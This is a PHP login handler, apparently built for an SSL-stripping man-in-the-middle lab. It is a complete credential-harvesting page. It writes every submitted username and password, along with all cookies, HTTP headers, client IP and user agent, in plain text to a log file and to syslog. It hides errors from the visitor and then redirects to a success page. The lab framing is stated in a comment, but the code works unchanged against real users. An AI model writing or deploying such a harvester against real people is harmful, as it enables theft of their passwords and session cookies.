<?php
/**
 * Login Handler for MITM Demonstration
 * 
 * This script captures login credentials and cookies for demonstration
 * of SSL stripping attacks in a controlled lab environment.
 * 
 */

// Enable error logging but don't display errors to user
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/tmp/php_errors.log');

// File to store captured credentials
$log_file = '/tmp/captured_credentials.log';

// Get client information
$client_ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'HTTPS' : 'HTTP';

// Function to log captured data
function log_capture($data) {
    global $log_file;
    $entry = str_repeat('=', 70) . "\n";
    $entry .= $data . "\n";
    $entry .= str_repeat('=', 70) . "\n\n";
    file_put_contents($log_file, $entry, FILE_APPEND);
}

// Handle POST request (form submission)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Capture credentials
    $capture_data = "CREDENTIAL CAPTURE\n";
    $capture_data .= "Timestamp: {$timestamp}\n";
    $capture_data .= "Client IP: {$client_ip}\n";
    $capture_data .= "Protocol: {$protocol}\n";
    $capture_data .= "User Agent: {$user_agent}\n";
    $capture_data .= "Username: {$username}\n";
    $capture_data .= "Password: {$password}\n";
    
    // Capture cookies if any
    if (!empty($_COOKIE)) {
        $capture_data .= "\nCookies Received:\n";
        foreach ($_COOKIE as $key => $value) {
            $capture_data .= "  {$key}: {$value}\n";
        }
    }
    
    // Capture all headers
    $capture_data .= "\nHTTP Headers:\n";
    foreach (getallheaders() as $name => $value) {
        $capture_data .= "  {$name}: {$value}\n";
    }
    
    // Log the capture
    log_capture($capture_data);
    
    // Also log to syslog for real-time monitoring
    syslog(LOG_WARNING, "MITM CAPTURE - User: {$username}, IP: {$client_ip}, Protocol: {$protocol}");
    
    // Set a session cookie to demonstrate cookie capture
    session_start();
    $_SESSION['user'] = $username;
    $_SESSION['login_time'] = time();
    
    // Set additional cookies to demonstrate cookie stripping
    setcookie('auth_token', bin2hex(random_bytes(16)), [
        'expires' => time() + 3600,
        'path' => '/',
        'secure' => false,  // Will be set to false by SSL strip anyway
        'httponly' => true,
        'samesite' => 'Lax'
    ]);
    
    // Redirect to success page
    header('Location: /success.php');
    exit;
}

// If accessed via GET, redirect to main page
header('Location: /index.html');
exit;
